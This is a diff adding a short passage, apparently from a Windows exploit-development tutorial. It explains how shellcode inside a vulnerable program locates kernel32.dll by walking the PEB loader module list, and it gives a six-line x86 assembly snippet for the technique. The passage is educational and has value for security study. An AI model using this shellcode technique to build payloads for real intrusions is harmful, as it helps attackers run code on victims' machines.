@@ -1,0 +1,16 @@
+However, there is a better method to get the kernel32 base memory. 
+Using the fs selector, we can get into our PEB. By searching the 
+PEB_LDR_DATA structure, we will find the list of DLL which our 
+vulnerable program initialized when it start. The list of DLL will be 
+loaded in sequence, first, NTDLL, followed by Kernel32. So, by 
+traveling one nod forward in the list, we will get the base memory of 
+the Kernel32.dll. This technique, complete with the code, has been 
+published by researchers in VX-zine, then used by LSD in their 
+Windows Assembly component. 
+
+	mov   eax,fs:[30h]		; PEB  base
+	mov   eax,[eax+0ch]		; goto PEB_LDR_DATA
+	; first entry in InInitializationOrderModuleList
+	mov   esi,[eax+1ch] 
+	lodsd					; forward to next LIST_ENTRY
+	mov   ebx,[eax+08h]		; Kernel32 base memory
